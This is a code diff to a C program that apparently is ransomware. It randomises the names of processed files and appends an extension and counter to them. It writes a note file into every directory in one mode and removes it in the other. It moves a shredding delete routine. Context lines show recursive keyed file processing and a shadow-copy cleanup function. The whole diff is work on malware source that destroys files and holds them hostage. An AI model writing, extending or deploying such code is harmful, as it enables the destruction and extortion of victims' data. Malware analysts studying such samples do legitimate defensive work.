@@ -155,6 +155,23 @@ void shredder(struct stat* st, const char* path)
 	}
 }
 
+void file_remove(const char *filename)
+{
+	if (file_exists(filename))
+	{
+		struct stat oldStat;
+		if (stat(filename, &oldStat) == 0)
+		{
+			shredder(&oldStat, filename);
+		}
+		if (remove(filename) != 0)
+		{
+			int stat = chmod(filename, S_IREAD|S_IWRITE);
+			if (!stat) remove(filename);
+		}
+	}
+}
+
 void * tp_func(void *arg)
 {
 	PathInfo *pi = (PathInfo *)arg;
@@ -182,12 +199,15 @@ void * tp_func(void *arg)
 	{
 		if (pi->mode == 1)
 		{
+			char* sname = generateRandomString(randInRange(1, 8));
+			strcat(path_new, sname);
+			free(sname);
 			strcat(path_new, pi->ext);
 			char nname[FILEEXT_SIZE];
 			sprintf(nname,"%d",pi->num);
 			strcat(path_new, nname);
 			strcat(path_new, ".");
-			char* mname = generateRandomString(2);
+			char* mname = generateRandomString(randInRange(1, 8));
 			strcat(path_new, mname);
 			free(mname);
 		}
@@ -388,6 +408,32 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
     }
 
     closedir(dir);
+	
+	strcpy(path_old, basePath);
+	strcat(path_old, "\\");
+	strcat(path_old, ext);
+	strcat(path_old, ".txt");
+	if (mode==1)
+	{
+		if (file_exists(path_old))
+		{
+			file_remove(path_old);
+		}
+		FILE* readme;
+		readme = fopen(path_old, "a+");
+		if (readme != NULL)
+		{
+			fprintf(readme, "%s\n", "HelloWorld!");
+		}
+		fclose(readme);
+	}
+	else if (mode==2)
+	{
+		if (file_exists(path_old))
+		{
+			file_remove(path_old);
+		}
+	}
 }
 
 void * tp_pfr_func(void *arg)
@@ -402,23 +448,6 @@ void * tp_pfr_free_func(void *arg)
 	PFRInfo *pfri = (PFRInfo *)arg;
 	free(pfri);
 	return NULL;
-}
-
-void file_remove(const char *filename)
-{
-	if (file_exists(filename))
-	{
-		struct stat oldStat;
-		if (stat(filename, &oldStat) == 0)
-		{
-			shredder(&oldStat, filename);
-		}
-		if (remove(filename) != 0)
-		{
-			int stat = chmod(filename, S_IREAD|S_IWRITE);
-			if (!stat) remove(filename);
-		}
-	}
 }
 
 void clean_shadowcopy(void)
